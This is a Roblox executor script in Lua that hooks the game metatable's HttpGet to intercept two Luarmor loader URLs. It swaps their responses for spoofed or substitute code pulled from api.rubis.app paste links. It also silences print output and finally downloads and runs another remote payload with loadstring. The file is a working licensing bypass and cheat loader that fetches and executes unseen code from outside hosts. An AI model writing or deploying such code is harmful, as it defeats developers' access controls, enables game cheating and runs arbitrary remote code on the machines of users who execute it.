local old = clonefunction(print)
old("---Start---")
print = function(...)
    if ... == "[DuckHub] Quack Quack" then
        old(...)
        print = old
    end
    return
end

local oldhttp = shared.old_http or game.HttpGet
shared.old_http = oldhttp

local mt = getrawmetatable(game)
setreadonly(mt,false)
local oldindex = shared.old_index or mt.__index
shared.old_index = oldindex
mt.__index = newcclosure(function(self, key)
    if key == "HttpGet" then
        return function(self,url,...) 
            if url == "https://api.luarmor.net/files/v4/loaders/7a5f95793ba3790579501938459a4c0a.lua" then 
                task.delay(5, function(...)
                    task.spawn(function(...)
                        loadstring(request({Url = "https://api.rubis.app/v2/scrap/LqKdbcC6SGbK6C8X/raw",Method = "GET"}).Body)()
                    end)
                end)
                return "print('SPOOF REAL'); task.wait(9e9);"
            end
            if url == "https://api.luarmor.net/files/v4/loaders/6ed8b62881ce64364e782a23a42b9977.lua" then 
                print("PUT LRM")
                return  request({Url = "https://api.rubis.app/v2/scrap/xEfJKb8qK6SmcUeK/raw",Method = "GET"}).Body
            end
            return oldhttp(self,url,...)         
        end
    end
    return oldindex(self,key)
end)

loadstring(oldhttp(game,"https://api.rubis.app/v2/scrap/2FQP2rf9Ij5lv2aZ/raw"))()